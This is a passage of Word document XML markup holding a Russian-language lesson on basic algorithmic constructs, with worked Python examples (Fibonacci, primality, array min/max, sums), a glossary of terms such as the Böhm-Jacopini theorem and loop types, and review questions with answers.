        </w:rPr>
        <w:t>Последовательность Фибоначчи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> \(F_0 = 0, F_1 = 1, F_n = F_{n-1} + F_{n-2}\).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("Сколько чисел вывести: "))</w:t>
        <w:br/>
        <w:t>a, b = 0, 1</w:t>
        <w:br/>
        <w:t>for _ in range(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(a, end=" ")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    a, b = b, a + b</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Сколько чисел вывести: 10</w:t>
        <w:br/>
        <w:t>0 1 1 2 3 5 8 13 21 34</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 5: Проверка на простоту</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Проверить, является ли число простым.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>import math</w:t>
        <w:br/>
        <w:br/>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:br/>
        <w:t>if n &lt; 2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Не простое")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    is_prime = True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(2, int(math.sqrt(n)) + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if n % i == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            is_prime = False</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Простое" if is_prime else "Не простое")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 17</w:t>
        <w:br/>
        <w:t>Простое</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 6: Поиск минимума и максимума в массиве</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти минимальный и максимальный элемент массива.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>arr = [3, 7, 2, 9, 5, 1, 8]</w:t>
        <w:br/>
        <w:t>min_val = arr[0]</w:t>
        <w:br/>
        <w:t>max_val = arr[0]</w:t>
        <w:br/>
        <w:br/>
        <w:t>for num in arr:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if num &lt; min_val:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        min_val = num</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if num &gt; max_val:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        max_val = num</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(f"Минимум: {min_val}, Максимум: {max_val}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Минимум: 1, Максимум: 9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 7: Подсчёт элементов с условием</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Подсчитать количество чётных чисел в массиве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>arr = [3, 7, 2, 9, 5, 1, 8, 4]</w:t>
        <w:br/>
        <w:t>count = 0</w:t>
        <w:br/>
        <w:br/>
        <w:t>for num in arr:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if num % 2 == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        count += 1</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(f"Количество чётных: {count}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Количество чётных: 3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 8: Таблица квадратов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вывести таблицу квадратов чисел от 1 до 10.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for i in range(1, 11):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"{i}² = {i**2}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1² = 1</w:t>
        <w:br/>
        <w:t>2² = 4</w:t>
        <w:br/>
        <w:t>3² = 9</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>10² = 100</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 9: Сумма чётных чисел от 1 до N</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти сумму всех чётных чисел от 1 до N.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("N = "))</w:t>
        <w:br/>
        <w:t>total = 0</w:t>
        <w:br/>
        <w:t>for i in range(2, n + 1, 2):  # range с шагом 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">    total += i</w:t>
        <w:br/>
        <w:t>print(f"Сумма чётных: {total}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>N = 10</w:t>
        <w:br/>
        <w:t>Сумма чётных: 30</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>(2 + 4 + 6 + 8 + 10 = 30)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 10: Двумерный массив — сумма всех элементов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти сумму всех элементов матрицы 3×3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>matrix = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [1, 2, 3],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [4, 5, 6],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [7, 8, 9]</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t>total = 0</w:t>
        <w:br/>
        <w:t>for i in range(3):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for j in range(3):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        total += matrix[i][j]</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(f"Сумма всех элементов: {total}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Сумма всех элементов: 45</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>(1+2+3+4+5+6+7+8+9 = 45)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теорема Бёма-Якопини</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — доказательство того, что любой алгоритм можно построить из трёх конструкций: последовательность, ветвление, цикл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последовательность (линейный алгоритм)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — выполнение команд одна за другой, без условий и повторений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ветвление (условный оператор)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — выбор одного из путей выполнения в зависимости от условия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полное ветвление</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — есть ветка для "истина" и для "ложь" (if-else).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неполное ветвление</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — есть только ветка для "истина" (if без else).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Множественное ветвление</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — несколько условий проверяются последовательно (if-elif-else или switch-case).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вложенные условия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — условие внутри условия (if внутри if).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл с предусловием (while)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — условие проверяется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>до</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> выполнения тела цикла. Может не выполниться ни разу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл с постусловием (do-while)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — условие проверяется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>после</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> выполнения тела цикла. Выполняется хотя бы один раз.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл со счётчиком (for)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — повторение действий заданное количество раз (известно заранее).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вложенные циклы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — цикл внутри цикла. Используется для многомерных данных или перебора всех комбинаций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — досрочный выход из цикла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>continue</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — переход к следующей итерации цикла (пропуск оставшейся части тела).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бесконечный цикл</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — цикл, который никогда не завершается (условие всегда истинно). Используется в серверах, игровых циклах, ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность O(n²)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — характерна для двух вложенных циклов по n итераций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сформулируйте теорему Бёма-Якопини.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: любой алгоритм можно построить из трёх конструкций._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Назовите три базовые алгоритмические конструкции.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ: последовательность, ветвление, цикл._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается полное ветвление от неполного?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: полное — if-else, неполное — if без else._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается while от do-while?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: while проверяет условие до выполнения, do-while — после. do-while выполнится хотя бы один раз._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Когда использовать цикл for, а когда while?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: for — когда известно количество итераций, while — когда неизвестно (зависит от условия)._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что делает оператор break? А continue?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ: break — выход из цикла, continue — переход к следующей итерации._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Какая сложность у алгоритма с двумя вложенными циклами (n × n)?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ: O(n²)._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Когда бесконечный цикл — это нормально?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: серверы, игровые циклы, ОС, меню программы._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Напишите псевдокод алгоритма, который проверяет, чётное ли число.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ввести n</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Если n mod 2 = 0, то:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       Вывести "Чётное"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Иначе:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       Вывести "Нечётное"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Найдите сумму чисел от 1 до 100 с помощью цикла.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    total = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for i in range(1, 101):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        total += i</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    print(total)  # 5050</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Напишите алгоритм, который выводит все числа от 10 до 1 (в обратном порядке).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for i in range(10, 0, -1):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        print(i)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Напишите алгоритм, который считает сумму цифр числа 9876.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    n = 9876</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    total = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    while n &gt; 0:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        total += n % 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        n //= 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    print(total)  # 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Напишите алгоритм, который проверяет, является ли число 29 простым.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    import math</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    n = 29</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    is_prime = True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for i in range(2, int(math.sqrt(n)) + 1):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if n % i == 0:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            is_prime = False</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    print("Простое" if is_prime else "Не простое")  # Простое</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Напишите алгоритм, который выводит первые 8 чисел Фибоначчи.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    a, b = 0, 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _ in range(8):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        print(a, end=" ")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        a, b = b, a + b</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Вывод: 0 1 1 2 3 5 8 13</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Найдите максимум в массиве [12, 7, 19, 3, 25, 10].</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    arr = [12, 7, 19, 3, 25, 10]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
